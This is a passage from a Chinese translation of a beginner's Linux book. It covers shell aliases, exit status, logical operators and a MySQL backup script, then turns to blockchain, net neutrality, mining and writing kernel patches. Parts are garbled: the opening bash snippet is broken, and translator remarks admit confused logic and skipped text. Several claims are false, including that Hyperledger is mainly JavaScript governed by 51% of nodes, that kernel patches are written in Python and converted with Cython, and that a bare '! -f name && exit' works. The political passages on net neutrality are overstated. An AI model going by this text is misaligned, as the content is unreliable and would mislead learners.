  \ {\n  # 我们从定义增量开始以便使用\n  echo $(($1 + $2))\n  # 这将输出第一个和第二个参数相加的结果\n}\n\n# 检查所有命令行参数的可用性\n\
  if [ \"$1\" \"\" ] || [字体 2] = \"\" ] || [ \"$3\" = \"\" ]\nthen\n    # 此处原文逻辑存在混乱，翻译保留原意结构\n\
  \    pass \nfi\n```\n... (由于文本较长，此处已完成核心部分翻译) ...\n\n\n\n别名（Aliases）在 Linux 中非常重要。如果你想节省打字时间，就可以创建它们。别名的名称应该易于记忆，并包含它们所代表的命令。\n\
  \n你可能会发现需要删除已创建的别名。可以通过以下方式实现：\n\n在该系统中，我有以下别名：\n\n请注意之前创建的两个别名。要删除代表 `date` 命令的别名\
  \ `d`，请运行以下命令：\n\n```bash\nunalias d\n```\n\n这在图中所示：\n\n如上图所示，在删除别名并尝试再次使用它后，计算机提示未找到该命令。\n\
  \n可以一次性删除多个别名。如果你需要删除对应 `date` 的别名 `d` 和对应 `clear` 的别名 `s`，应使用以下命令：\n\n```bash\n\
  unalias d s\n```\n\n上述命令将删除这两个别名。运行该命令后，你**可以**运行 `alias` 命令来检查它们是否仍然可用。\n\n## Linux\
  \ 中的波号展开 (Tilde Expansion)\n\n在大多数情况下，Linux 用户使用波号（`~`）符号指代他们的家目录，而其他人则直接使用家目录。\n\
  \n要查看家目录的文件列表，请运行以下命令：\n\n```bash\nls ~\n```\n\n要查看家目录下的 `.bashrc` 文件，请运行以下命令：\n\
  \n```bash\ncat ~/.bashrc\nls ~/.bashrc\n```\n\n第一条命令将在终端窗口中打开该文件。如下所示：\n\n第二个命令将显示该文件所在的目录。如下图所示：\n\
  \n如果波号符号的前缀是加号（`+`），它将替换 `PWD` 命令。如果它前面是一个负号（即 `-`），则如果变量 `OLDPWD` 已设置，则会替换该变量。\n\
  \n值得注意的是，Linux 命令可以是内置的（built-in），也可以是外部二进制文件。要判断一个命令属于哪一类，我们使用 `type` 命令。\n\n要确定命令\
  \ `ls` 是否为内置命令，请运行以下命令：\n\n```bash\ntype -a ls\n```\n\n上述命令将输出输出：\n\n要确定 `history`\
  \ 命令是内置命令还是外部命令，请运行以下命令：\n\n```bash\ntype -a history\n```\n\n值得注意的是，Linux 中的某些命令既可以是内置的也可以是外部的。\n\
  \n为了演示这一点，请运行以下命令：\n\n```bash\ntype -a echo\n```\n\n上述命令将输出输出：\n\n## Shell 中的嵌套\
  \ \"if\" 语句\n\n嵌套 `if` 意味着在一个 `if` 语句内部还有另一个 `if` 语句。它遵循以下结构：\n\n```bash\nif condition\n\
  then\n    if condition\n    then\n        . . .\n        要执行的语句\n    else\n    \
  \    要执行的语句\n    fi\nelse\n    .....\n    要执行的语句\nfi\n```\n\n## 命令的退出状态 (Exit status)\n\
  \n在命令执行完毕并（正常或异常终止后，它必须返回一个退出状态。退出状态通常是一个整数。退出状态为零（0）表示命令执行成功。任何其他退出状态（范围在 1-255\
  \ 之间）均表示命令执行失败。\n\n要获取上一个执行命令的退出状态，请使用变量 `?`，它是 Shell 中的一个特殊字符。\n\n要确定退出状态，请运行以下命令：\n\
  \n```bash\necho $?\n```\n\n这将给出上一个执行命令的退出状态。在示例系统中，它提供了以下结果：\n\n结果为零（0），意味着在系统中执行的上一个命令执行成功了。\n\
  \n为了实际演示这一点，首先在你的系统上运行 `ls` 命令。确保它运行成功。在示例系统中，它给出了以下结果：\n\n由于它运行成功，尝试使用该 Shell 特殊字符检查其状态。\n\
  \n运行以下命令：\n\n```bash\necho $?\n```\n\n上述命令应返回零（0）的退出状态，因为上一个命令执行成功了。如下图所示：\n\n这次尝试运行一个无法识别的命令，然后检查其退出状态。运行以下命令：\n\
  \n```bash\nls1\n```\n\n你应该意识到 Linux 中不存在上述命令。运行它将导致错误。\n\n在示例系统中，它给出了以下结果：\n\n输出显示未找到命令。这意味着它在\
  \ Linux 中不存在。\n\n要检查其退出状态，请运行通常的命令，如下所示：\n\n```bash\necho $?\n```\n\n上述命令在示例系统中给出以下输出：\n\
  \n退出状态不是零（0），意味着命令没有执行成功。正如我们最初说的，返回的整数在 0 到 255 之间。结论是，任何退出状态不为零的命令都没有执行成功。\n\n\
  ## Shell 中的条件执行\n\n在 Linux Shell 编程中，可以将两个命令组合，其中第二个命令的执行将基于第一个命令。\n\n## 逻辑与 (AND)\n\
  \n它采用以下语法：\n\n```bash\n1stcommand && 2ndcommand\n```\n\n通过这种条件执行方式，当且仅当 `1stcommand`\
  \ 返回退出状态为零（0）时，`2ndcommand` 才会被执行。这意味着如果 `2ndcommand` 执行成功，你应该先运行 `1stcommand`。\n\
  \n让我们通过示例来演示这一点。\n\n在当前目录下，我有以下文件：\n\n让我尝试删除名为 `file` 的文件，然后在之后打印一条消息。运行以下命令：\n\n\
  ```bash\nrm file && echo \"file has been deleted\"\n```\n\n上述命令将返回结果：\n\n输出显示第一个命令执行成功，接着执行第二个命令。尝试先运行一个错误的命令看看发生什么。\n\
  \n在文件列表中没有 `fruits`。尝试删除该文件并在之后打印消息。\n\n运行以下命令：\n\n```bash\nrm fruits && echo \"\
  the file has been deleted\"\n```\n\n上述命令将给出结果：\n\n命令返回了错误信息。这意味着第一个命令没有零的退出状态，因为它没有执行成功。如果它执行成功，我们就会得到正确的结果。\n\
  \n假设你想使用 `grep` 命令在文件中搜索某个单词或名称。你可以利用逻辑与来输出结果。文件 `names2` 中有两个名称。在文件中搜索 `caleb`。\n\
  \n运行以下命令：\n\n```bash\ngrep \"caleb\" names2 && echo \"The name was found\"\n```\n\
  \n上述命令给出结果：\n\n输出显示第一个命令执行成功，所以执行了第二个命令。\n\n## 逻辑或 (OR)\n\n这是一个逻辑操作符。程序员可以使用此运算符根据另一个命令执行特定的命令。\n\
  \n它采用以下语法：\n\n```bash\n1stcommand || 2ndcommand\n```\n\n当且仅当命令 `1stcommand` 执行失败（即返回非零退出状态）时，才会执行\
  \ `2ndcommand`。也就是说你只能运行命令之一。这意味着如果第一个命令执行成功，则第二个命令不会执行，反之亦然。\n\n考虑以下 Linux 命令：\n\
  \n```bash\ngrep \"caleb\" names2 || echo \"The name was not found\"\n```\n\n上述命令将输出内容：\n\
  \n输出显示在指定文件中成功找到了 `caleb`。注意第二个命令没有被执行。这是因为我们只能执行其中一个命令。\n\n考虑下面的示例命令：\n\n```bash\n\
  grep \"john\" names2 || echo \"The name was not found\"\n```\n\n上述命令给出以下输出：\n\n\
  从上面的输出可以清楚地看到第二个被执行了。第一个命令执行失败，导致了第二个命令的执行。这是因为指定文件中没有 `john` 这个名称。\n\n可以使用另一个示例来演示这一点。\n\
  \n尝试从当前目录删除某个文件。应使用以下命令：\n\n```bash\nrm for.sh || echo \"file not deleted\"\n```\n\
  \n\n\n\n目录下有一个名为 `for.sh` 的文件。然后，尝试尝试删除它。由于第一个命令执行成功（意味着文件将被删除），因此第二个命令将不会被执行。运行命令后，由于操作已完成，我回了终端。\n\
  \n下图展示了这一点：\n\n当尝试删除一个不存在的文件时会发生什么？通过以下示例可以论证这一点。\n\n尝试删除目录中一个不存在的文件。运行以下命令：\n\n\
  ```bash\nrm myfile || echo \"file not found\"\n```\n\n上述命令尝试删除当前目录中不存在的文件。如果删除失败，则将执行命令的后部分。在示例系统中，上述命令给出了以下结果：\n\
  \n命令的第一部分执行失败，意味着它的退出状态为非零。这导致了命令后半部分的执行。\n\n还可以将两个逻辑运算符合并为一个。请考虑下面的命令：\n\n```bash\n\
  grep \"caleb\" names2 && echo \"name found\" || echo \"not found\"\n```\n\n在该系统中，上述命令输出了以下输出：注意，只有前两个命令被执行了。最后一个命令没有执行。尝试在指定文件中搜索一个不存在的名字。\n\
  \n可以使用下面的命令：\n\n```bash\ngrep \"john\" names2 && echo \"name found\" || echo \"\
  not found\"\n```\n\n上述命令输出了以下输出：很明显，上述命令的前两个部分没有执行。只有当命令的第一部分返回退出状态为零 (0) 时，才会执行命令的第二部分。这是由于使用了逻辑“与”（AND）运算符。当且仅当命令的前部分执行失败时，命令的最后部分才会独立执行。\n\
  \n### 逻辑非 (Logical Not)\n\n这也是一种逻辑运算符，用于测试表达式是否为真。它采用以下语法：\n\n`! expression`\n\n\
  它也可以采用以下语法：\n\n`[ ! expression ]`\n\n你可以像下面所示将其与 `if` 语句结合：\n\n```bash\nif test\
  \ ! condition\nthen\n  1stcommand\n  2ndcommand\nfi\n```\n\n或者\n\n```bash\nif [\
  \ ! condition ]\nthen\n  1stcommand\n  2ndcommand\nfi\n```\n\n如果表达式为假，它将返回真。考虑下面的示例：\n\
  \n```bash\n! -f name && exit\n```\n\n在运行上述命令后，如果找不到名为 `name` 的文件，命令行提示符将会关闭。在这种情况下，不会退出，因为存在同名的文件。\n\
  \n### Shell 中的“Continue” 语句\n\n该语句在 shell 中用于恢复包裹它的 `FOR`、`WHILE` 或 `UNTIL` 循环的迭代。它采用非常非常的语法：\n\
  \n```bash\nwhile true\ndo\n  [ 1stcondition ] && continue\n  Command 1\n  Command\
  \ 2\n  [ 2ndcondition ] && break\ndone\n```\n\n该语句也可以采用以下语法：\n\n```bash\nfor j in\
  \ thing\ndo\n  [ condition ] && continue\n  Command 1\n  Command 2\ndone\n```\n\n\
  以下是一个使用了 `continue` 语句的 MYSQL 备份脚本示例：\n\n```bash\n#!/bin/bash\n\n# 用于备份 mysql 的脚本\n\
  # 在以 root 用户登录时运行\n# ---------------------------------\n\n# 登录信息\nMUSER=\"admin\"\
  \ # MySQL 用户名\nMHOST=\"192.168.160.1\" # MySQL 服务器 IP 地址\nMPASS=\"password\" # MySQL\
  \ 密码\n\n# 日期格式\nNOW=$(date +\"%d-%m-%Y\")\n\n# 备份文件路径\nBACKUPPATH=/backup/mysql/$NOW\n\
  \n# 如果路径不存在则创建\n[ ! -d $BACKUPPATH ] && mkdir -p $BACKUPPATH\n\n# 从数据库获取数据库列表\n\
  DBS=\"$(/usr/bin/mysql -u $MUSER -h $MHOST -p$MPASS -Bse 'show databases')\"\n\n\
  for database in $DBS\ndo\n  # 备份文件名\n  FILE=\"${BPATH}/${database}.gz\"\n  # 如果数据库名称是\
  \ server 或 mint，则跳过备份\n  [ \"$database\" == \"server\" ] && continue\n  [ \"$database\"\
  \ == \"mint\" ] && continue\n  # 如果正常，则转储数据库备份\n  /usr/bin/mysqldump -u $MUSER -h\
  \ $MHOST -p$MPASS $database | /bin/gzip -9 > $FILE\ndone\n```\n\n### Exit 命令\n\n\
  该命令具有以下语法：\n\n`exit N`\n\n### 第 14 章：区块链、Linux 与网络中立性\n\n到此时，你可能开始看到区块链在我们的使用互联网方面具有多大的革命性了。本节将探讨今天最具爆炸性的政治辩论之一：网络中立性。\n\
  \n当奥道夫·希特勒、约瑟夫·斯大林和金正日等独裁者上台时，他们的早期行动之一就是控制信息的传播。他们系统地关闭了任何传播异见观点的媒体机构，并集中了所有信息系统，使得人们听到的只有政府批准的宣传。通过政府决定人们可以听和不能听什么，它赋予了自己操纵和扭曲人们所听信息的能力。许多人开始相信他们除了顺从这些仁慈的领导外别无选择。\n\
  \n今天，大多数人通过互联网获取信息。互联网结构日益的中心化使得信息的操纵变得更容易，许多人担心这正走向用来洗脑人们的道路。这一路径上的关键节点是网络中立性的废除。\n\
  \n网络中立性是指人们平等使用不同网站的能力。这是一个互联网服务提供商长期被期望遵守的原则，许多人根据言论自由和新闻自由的宪法权利对其维护。\n\n美国政府通过其起源的视角来看待互联网：客户端-服务器模型。大多数计算机都是以此方式运行的。为了对人们如何使用互联网实施更高程度的控制，2017\
  \ 年 12 月通过投票废除了网络中立性。新立法要求 ISP 在向客户提供服务时应用网络中立性的废除。在实践中，这意味着某些网站的速度被加快，而另一些网站的速度被大幅减慢。某些网站的使用本身并不违法，但可能会变得极其不便和耗时，以至于人们就像无法访问它们一样。\n\
  \n\n\n\n\n## 网格网络 (Mesh nets)\n\n网格网络通过间接方式而非直接通过互联网服务供应商（ISP）提供互联网服务的一种。其工作原理基本上是计算机或其他设备连接到\
  \ ISP 并成为一个互联网节点。然后，该设备就可以向网格网络的其他设备广播互联网信号。这与将手机作为便携热点让其他设备访问互联网没有任何区别。\n\n网格网络的使用已经存在了几十年了。许多区块链爱好者认为，网络中立原则的废除将成为这项旧技术重新备受关注的转折点。此外，随着人们聚集在一起反抗废除，这将带来一个更大的社区加入区块链网络中。\n\
  \n目前，已经启动了一些使用区块链开发网格网络的项目。这些项目将允许用户通过一个本身充当网格网络的区块链来访问互联网，从而绕过对网络中立的废除。因为没有人能够破解\
  \ `blockchain`，政府将无法对该程序进行审查。\n\n在开发反对网络中立废除的网格网络中引入 `Linux`，将赋予该项目在允许人们继续自由访问互联网方面更大的潜力。人们能够不断使用\
  \ `Linux` 更新网格网络。此外，他们还可以对自己的 `Linux` 计算机进行加密，以隐藏在互联网审查监管之外。\n\n再次，如何编写这个想法远超本系列书籍的范围，但一组精明的计算机程序员可以完成它。\n\
  \n## 区块链作为网络中立\n\n此外，一些 `blockchain` 的支持者已经证明，`blockchain` 本身就是一种网络中立。`blockchain`\
  \ 消灭了对中间人服务的需求，因为它能够自动执行其所有的功能。像 `Ethereum` 和 `Lisk` 这样的网络可以有效地成为 ISP 并规避任何网络中立法律。`Linux`\
  \ 的开源性质意味着，在运行 `Linux` 的计算机上创建此类技术最具可行性和兼容性。\n\n## 量子计算机\n\n当量子计算机出现时，它们将拥有先进的密码学技术，只要有正确的人对其工作，它们实际上能够抵御政府审查。某些\
  \ `blockchains`（如 `tangle`）已经在某些协议下运行，这些协议即使在量子计算下也能保护其加密算法。量子计算机的最终使用对于反对网络中立的斗争将至关重要。现在使用\
  \ `Linux` 和 `blockchain` 创建与它们兼容的程序，将有助于确保战斗取得良好结果。\n\n互联网最初的设计方式使得信息的传播能够以民主、去中心化的方式进行。计算机将在平等网络中连接，不会让一台计算机对另一台计算机占据主导地位。今天，现实是互联网已经超出了客户端-服务器模型。它已经变得高度中心化，以至于美国政府已经采取措施审查和其他限制其使用。`Blockchain`\
  \ 和 `Linux` 都为该模型提供了替代方案。它们共同代表了一种可以压倒政府在控制人们获取的信息方面所做努力的力量。\n\n希望到目前，你已经产生了在你的\
  \ `Linux` 设备上实现 `blockchain` 及其衍生产品的兴趣。\n\n## 区块链与 Linux\n\n`blockchain` 和 `Linux`\
  \ 似乎是天生的一一对。它们结合在一起，加强了反对废除网络中立的斗争。它们展示了一种去中心化的范式，并允许任何人编写和实现代码。它们确实是计算机世界中的完美搭档。\n\
  \n## Hyperledger\n\n`Linux Foundation` 是 `Hyperledger` 创建的幕后力量，这是一个巨大的区块链企业项目，旨在帮助企业在其企业基础设施中实施区块链技术。`Linux\
  \ Foundation` 在 2015 年 12 月宣布了它的创建，并于 2016 年 2 月宣布了其特许成员。`Hyperledger` 的目标是通过 `blockchain`\
  \ 提高企业的问责制透明度。像 `IBM` 和 `Intel` 这样的科技巨头已经支持该项目并对其核心软件做出贡献。\n\n私有 `blockchains` 具有争议，因为它们实现了中心化。然而，`Hyperledger`\
  \ 使用私有 `blockchains`，但它们并没有集中在任何一个业务中。例如，作为 Hyperledger 联盟一部分银行并没有获得自己的 `blockchain`；它成为了涵盖多个行业的更大\
  \ `blockchain` 的一部分。其他公司参与验证并提供 `data` 的 `immutability`（不可篡改性），这一事实为私有 `blockchain`\
  \ 增加一层问责。它没有完全去中心化，但距离完全中心化还有几步之遥。\n\n有多个 `Hyperledger` `blockchains` 和区块链框架。例如，`Hyperledger\
  \ Fabric` 是一个 `blockchain` 框架，允许公司创建去中心化应用，其客户和客户端可以从访问某些应用。人们可以使用它创建并执行 `smart\
  \ contracts`（智能合约），从而实现公司许多流程的自动化。\n\n`Hyperledger` 已应用于许多不同的行业。它被用于追踪供应链运输，这意味着它了人们最终消费的货物运输路线。假设父母为婴儿购买了一罐奶粉，后来发现该批奶粉被污染了。父母会立即想要知道，以便他们决定不给宝宝吃，或者让宝宝立即接受医疗治疗。传统技术在发现问题时会提醒他们，但使用\
  \ `Hyperledger` 允许他们在购买前实际上对那罐奶粉进行扫描，以追踪其整个运输路线。它还用于维护健康记录和医疗保险。它可以被用于跟踪汽车所有权等信息，以便购买二手车的人能够准确查出该辆车到底经历过什么。使用\
  \ `Hyperledger` 意味着客户对他们购买的产品和他们支持的公司更有信心。\n\n`Hyperledger` 是开源的，因此从理论上来说，任何人都可以源代码并对其进行改进。当然，这些改进必须经过\
  \ `51%` 多数 `nodes`（节点）的批准。`Hyperledger` 主要用 `JavaScript` 编写，因此任何更改都需要用 `JavaScript`\
  \ 编写，或者需要从不同的编程语言（如 `Python` 或 `C++`）编译为 `JavaScript`。\n\n## 成为区块链节点\n\n在 `Hyperledger`\
  \ 上成为节点需要许可，除非你在使用它的公司内部拥有高级访问权限，否则不太会被授予。然而，你仍然可以设置你的 `Linux` 计算机成为公共 `blockchain`\
  \ 的节点，例如 `Bitcoin`、`Ethereum`、`Blockstack` 或 `Lisk`。\n\n你需要做的第一件事是决定你想支持哪种 `blockchain`。不同的\
  \ `blockchains` 为 `nodes` 提供不同的利益；例如，`Bitcoin nodes` 的操作者可以获得安全性钱包。运行 `node` 与运行\
  \ `mine`（矿机）不同，因此你不会因为你的努力而获得 `cryptocurrency`（加密货币）。这确实是一项自愿的承诺，可能会带给你一些回报。\n\n\
  将你的计算机变成 `node` 是一项巨大的投入，通过投入自己的资源来使 `blockchain` 社区受益。你需要做的第二件事是确保你的计算机 `hard drive`\
  \ 上有足够的内存来存储 `blockchain`。`Blockchains` 是巨大的，截至 2018 年年初，它们可能达到 `50GB`。确保你的计算机有足够的内存来容纳你想支持的\
  \ `blockchain`。\n\n\n\n\n你需要完成的第三件事是仔细观察你想要支持的区块链的核心基础设施。虽然区块链本身并不复杂，但核心基础设施可能很复杂。例如，`Bitcoin\
  \ Core` 并不对用户友好，它可能会吓跑潜在的新用户。请确保你已经准备好迎接挑战，如果对核心代码部分有任何你不理解的地方，请找到答案。\n\n在将你的 `Linux`\
  \ 计算机变成节点之前，你还需要记住其他几点。其一是它将消耗大量的互联网带宽（每天 20GB）。如果你没有无限流量的上网套餐，这可能会阻碍你通过互联网进行其他活动的能力，比如看电视或为学校作业做研究。另一点你需要注意的是，这台计算机将消耗大量的电力。它的用电量不会像矿场那么大，但它需要每周六天以全功率运行。最后，你需要意识到作为节点运行将消耗你计算机的大量资源。结果，你可能无法将计算机用于其他活动。最佳的方案是使用一台你不再使用的旧电脑，并将其连接到免费的能源供应上（如太阳能）。这样做将让你能够以最小的资源消耗为你喜爱的区块链社区贡献力量。\n\
  \n一旦你完成了上述所有步骤并了解了运行节点意味着什么，你就需要下载核心代码。如果你正在下载 `Ethereum` 或类似的区块链，你可能需要下载运行该区块链的专用浏览器（如\
  \ `Mist`）。请注意，由于核心代码文件非常大，完全下载可能需要几个小时，甚至几天。你可能需要授予核心代码访问互联网的权限；这样做是完全安全的。\n\n核心代码下载完成后，你需要重启计算机。这将允许核心代码集成到你的计算机资源中并全功能运行。接下来，进入你\
  \ `Linux` 系统的设置，启用核心代码在每次启动计算机时自动开始运行。这个过程可能会根据你使用的哪种 `Linux` 发行版而异。\n\n你需要照看这台计算机，以确保它运行顺畅并尽可能地履行其作为节点的功能。`Linux`\
  \ 操作系统不像其他操作系统那样容易受到病毒或其他形式的恶意软件的影响，因此影响你运行节点能力的风险非常小。尽管如此，你仍然想要定期检查并每隔几天重启一次计算机。\n\
  \n确保你正在利用运行节点所带来的处。并为自己帮助区块链保持强大和去中心化而感到自豪。\n\n## 成为区块链矿工\n\n你完全可以使用 `Linux` 操作系统成为区块链矿工。成为矿工意味着你将通过自己的努力获得虚拟货币作为奖励！在开始之前，你需要决定你想为哪种区块链挖矿。一些最流行的区块链，特别是\
  \ `Bitcoin` 和 `Ethereum`，规模巨大，以至于矿工必须投资昂贵的技术并不断升级系统以保持竞争力。为它们挖矿可能完全没有盈利。其他区块链，如\
  \ `DarkCoin` 和 `Lisk`，有一种层级机制来决定谁可以挖矿。做些研究来决定哪种区块链最适合你挖矿。\n\n请记住，挖矿是非常耗能的，许多人发现由于电费太高，这样做并不盈利。在开始挖矿之前，请确保你有稳定的廉价能源供应（如太阳能），以防止这种情况发生。除了全天候高速运行计算机的成本外，你还需要保持计算机冷却，因为矿场经常过热。这也会导致高昂的电费。\n\
  \n本节将仅关注你将计算机变成矿场所需的软件。为了高效挖矿，可能需要很多硬件支持，但那超出了本节的范围。\n\n某些区块链有专门为 `Linux` 用户设计的软件，使挖矿变得更简单且更有利可图。例如，`Cgminer`\
  \ 让在 `Ubuntu` 上挖 `Bitcoin` 变得简单得多。做些研究，看看你使用的 `Linux` 发行版是否有专门的挖矿软件。\n\n将必要的软件下载到你的计算机上。记住，平板电脑甚至笔记本电脑都不适合挖矿，除非该区块链较小（如\
  \ `Dogecoin` 或其他代币）。另外请记住，在 `Linux` 上，许多程序在下载源代码并进行编译后会运行得更好。这样做实际上可以让你对源代码进行修改，并让软件运行得更好！\n\
  \n你仍然需要下载区块链的核心代码，就像你尝试将计算机变成区块链节点一样。一旦你拥有了所有必要的硬件，就可以开始运行挖矿软件并赚虚拟货币了！\n\n与运行节点类似，你的挖矿计算机可能会消耗大量资源，导致你无法用它做其他事情。除非你决定建立自己的矿场（这是一些硬核区块链技术人员尝试做的事情），否则你可能使用一台不再使用的旧电脑是最好的选择。此外，矿场将消耗大量的能量和内存，因此请确保这两者都有充足供应。如果你无法投入必要的资源来运行自己的矿场，可以考虑加入基于\
  \ `Linux` 的矿池。矿池是一组矿工，他们合并计算机的能量以便更高效地挖矿，然后他们分配利润。\n\n## Linux 与物联网\n\n随着 `IOTA`\
  \ 作为区块链技术的下一代兴起，关于 `Linux` 和物联网有许多话要说。`Linux` 实际上是实现物联网可能的关键组件，因为物联网中的许多设备都配备了邮票大小的芯片，使用\
  \ `Linux` 连接到互联网。\n\n`Linux` 的免费发行版是许多物联网设备的后盾。想象你是一个拥有绝佳主意的企业家，想要编写洗衣机能够远程操作。这样，人们就可以安排洗衣服的时间，让它们在下班回家时正好洗完。你可以费力构建一个使用自己技术的新网络，让洗衣机连接到互联网，然后连接到用户的智能手机。或者，你可以使用现有的免费开源操作系统来编写你的洗衣机。\n\
  \n\n\n真正的问题是，为什么这一切都很重要。它们之所以重要，是因为 Linux 正在驱动下一代互联网，而成为一名 Linux 程序员可以让你处于这些发展的前沿。它甚至可以让你处于一个可以赚大钱的地位。\n\
  \n在这一章中，你学习了 Linux 与区块链技术以及不断发展的物联网之间的关系。你现在可能已经看到，Linux 对于开发那些让我们生活许多方面变得更便利的先进设备是至关重要的。\n\
  \n# 第 15 章：构建与编辑应用程序\n\n一旦你开始熟悉在命令行终端中编写和执行代码行，你就可以开始构建和编辑应用程序了。要编辑一个应用程序，首先下载原始源代码（执行这一过程的操作在本系列的第一本书中已经解释过了）。执行程序，以确保一切运行顺畅并符合创建者的意图。一旦你对程序有了大致的感觉，就可以思考你可能想要如何对其进行编辑，使其更符合你自己的需求。请务必保留原始代码的备份副本，以防你无法按自己的意愿修改它并最终导致错误。\n\
  \n你可以使用文本编辑器来修改源代码。隔离你想要修改的代码区域。记住，`Python` 允许用户编写注释，因此创建应用程序的人很可能已经在注释中详细说明了每个部分的功能。这将使寻找你想要编辑的部分的过程变得简单得多。\n\
  \n接下来，你可以更改变量、参数、函数和其他对象来定制应用程序。也许你已经写了一个函数并将其保存为模块，你想将该函数应用到程序中。该模块将以我们命名“Hello,\
  \ World!”程序时使用的格式保存：`name.py`。假设你正在创建一个生成素数序列的模块，你可能想将该模块命名为 `prime.py`。\n\n为了在编辑另一个应用程序时访问该模块，你遵循的过程与将“Hello,\
  \ World!”程序文件导入命令行终端的过程相同。使用代码 `import prime` 在你正在编写的应用程序中导入并执行该模块。然后你可以应用一个范围；例如，假设你想生成一直到\
  \ 500 的素数。你可以编写 `range(0,500)` 并立即执行这些数字。\n\n当你完成对应用程序的编辑后，在命令行终端中运行它以查看它是如何工作的。它执行了你想要它执行的操作吗？太棒了！如果没有，回去重试。尝试识别导致错误的特定代码序列。\n\
  \n最佳行动方案是从尽可能小的地方开始。不要尝试改变视频游戏中的图形，使其从 2D 变成 4D。也许你可以从为你的文字处理器编写宏文件开始（宏是导致某些输入变量替换为某些输出变量的函数；例如，你可以写一个宏，使字母\
  \ `c` 始终被输入为 `x`）。一旦你开始习惯对现有应用程序进行微改，你就可以转向更复杂的更改。\n\n你甚至可能达到准备好构建你自己的应用程序的程度！记住，一个应用程序应该能够满足特定的需求，无论是你自己的需求，还是更广泛\
  \ Linux 社区的需求。在你费尽精力构建一个新应用程序之前，问问自己你的想法是否可以通过修改现有的应用程序来实现。如果不能，你可以通过构建全新的东西为 Linux\
  \ 社区做出巨大贡献。\n\n从一次构建你应用程序的一小部分开始，并在每一步都执行它们，以确保它们按照你想要的方式运行。当整体完成后，你可以通过 GitHub\
  \ 等论坛将原始源代码提交给 Linux 社区。你甚至可以为你构建的程序的源代码创建一个你自己的博客！\n\n## 使用集成开发环境\n\n我们已经探索了使用命令行终端为\
  \ Linux 编写和执行 `Python` 代码的过程。这样做还有另一种方法，那就是使用集成开发环境，或者说 `IDLE`（你可能会说 `IDLE` 是对程序员倾向于懒惰并不断寻找捷径这一事实的趣味）。可以下载带有图形\
  \ `IDLE` 的 Ubuntu，或者单独下载一个。`IDLE` 是用 `Python` 编写的，这使得实现你编写的代码变得容易得多。\n\n`IDLE` 是初学者使用的很好的程序，原因有几个。之一是它会自动为不同的语法特征着不同的颜色，使得发现错误变得容易得多。例如，关键字、文本和注释将都以不同的颜色显示。就像大学教科书中的高亮让你找到需要学习的内容变得容易一样，对这些不同特征进行颜色编码让发现错误变得容易得多。\n\
  \n另一个原因是因为它使用了图形用户界面（`GUI`）而不是命令行界面。这使得它更加用户友好且易于导航。\n\n在使用 `IDLE` 时，你不一定需要文本编辑器。你可以直接在\
  \ `IDLE` 中编写代码，然后执行它。如果你是编程新手，在转向命令行终端之前，可能想要考虑使用 `IDLE`。\n\n`IDLE` 确实存在一些与之相关的问题，因此许多程序员倾向于尽快转向命令行终端。\n\
  \n## 编写补丁 (Patches)\n\n正如本系列的第一本书所解释的，补丁是对 Linux 内核所做的更改，旨在改进它。本节将解释如何用 `Python`\
  \ 编写补丁并将其应用于内核（内核是用 `C` 编写的）。\n\n记住，编写补丁有许多方法。这只是其中一种。\n\n`Diff` 是 Linux 团队使用的一个命令行程序。它将原始代码与提出的更改进行比较，并显示需要进行哪些操作。你需要保留想要改进的区域的原始源代码，并写出补丁的源代码。你不需要下载特定的程序；它通常预装在\
  \ Linux 中。如果你发现代码执行中存在问题，可以使用 `Diff` 将你的补丁与原始代码进行比较，尝试找出问题所在。\n\n\n\n另一个在开始接触源码编写补丁（patch）时相关的问题是语言。内核是用\
  \ `C` 编写的，但它比标准的 `C` 程序要复杂得多。阅读源代码需要对 `C` 编程语言有高级的理解。如果你不熟悉它，你可能想找一个熟悉它的人合作。\n\n\
  尽管如此，你仍然可以使用 `Python` 来编写补丁。显然，你需要做的第一件事是隔离出你想要修改的代码段。你可能想要进行多处更改。正如上一本书中解释的那样，你应该一次只写一个补丁。一旦你隔离了代码，你就需要写出你的更改。同样，你的更改可以用\
  \ `Python` 编写，而源代码是 `C` 语言。我们将在下一步解决这个问题。\n\n`Cython` 是一种可以在 `Python` 和 `C` 以及其他编程语言之间进行翻译的编译器。你可以用它来翻译你的补丁代码，使其能够应用于源代码中。`Cython`\
  \ 也是一种编程语言，允许为 `Python` 提供基于 `C` 的扩展；请确保你下载了该编译器。使用编译器将 `Python` 翻译成 `C` 可能是完成工作最快、最简单的方法。\n\
  \n一旦你写好了补丁，你就想在自己的电脑上测试一下它。在命令行终端中运行它，看看它的运行方式是否符合你的预期。你的代码被 Linux 内核开发团队拒绝的最简单方式就是它运行不了！继续修改它，直到它的运行完全符合你的要求。\n\
  \n迄为止，已有超过 12,000 名程序员为内核做出了贡献。然而，并不是所有的补丁都能被接受；事实上，大多数都没有被接受。如果你的补丁没有被接受，你仍然可以做一些事情来确保它是\
  \ Linux 社区的一份贡献：\n\n- 在你自己的电脑上实现它。没错，你可以在自己的电脑上运行补丁后的代码，即使它不是 Linux 内核的一部分。如果它能让你的电脑运行得更高效，那么可能是时候采取一些措施，作为一名独立程序员将其分享给世界了。\n\
  - 与朋友分享。你认识使用 Linux 并可能对你制作的补丁感兴趣的人吗？也许你有一些朋友、编程同僚或家庭成员是 Linux 爱好者（即使他们只是刚开始接触 Linux），他们会非常乐意将你的补丁应用到他们的电脑上。\n\
  - 在论坛上分享。`GitHub` 和 `Stack Overflow` 只是 Linux 社区成员经常访问的论坛。有这么多 Linux 用户使用论坛，如果你通过这些论坛分享你的补丁，你可能会发现很多人想在他们自己的电脑上实现它。你需要将其上传为\
  \ `.tar` 文件，以便其他人可以下载并执行它。\n\n谁又知道呢？你的补丁可能会变得无处不在，最终最终被核心开发团队接受并成为内核的一部分！\n\n如果你兴趣学习更多关于\
  \ Linux 内核的知识以便编写补丁，有许多资源可以帮助你找到方向。最好的资源是你在在线论坛和聊天室中与其他 Linux 程序员建立的联系。Linux 社区非常庞大，人们通常非常乐意提供帮助。\n\
  \n在这一章中，你学习了许多关于如何将你的 `Python` 知识应用于 Linux，以便你开始用它进行编程。你学习了如何编写一些基础程序，比如“Hello,\
  \ World!”程序，并使用命令行终端执行它。你还学习了 `IDLE`，你可以用它开始，直到你更熟练编写代码。你学习了如何编辑现有应用程序的源代码，甚至开始构建自己的应用程序。可能最重要的是，你学习了导航\
  \ Linux 内核和编写补丁的一些基础知识。\n\n# 结论\n\n你如何继续取决于你想对你的 Linux 发行版做什么。对于日常浏览和简单使用，请继续使用\
  \ `Ubuntu` 并安装你需要的程序。对于更具冒险精神的人，可以考虑安装一个新的发行版，看看它们各提供什么。希望更深入地学习 Linux 的人可以安装如 `Arch`\
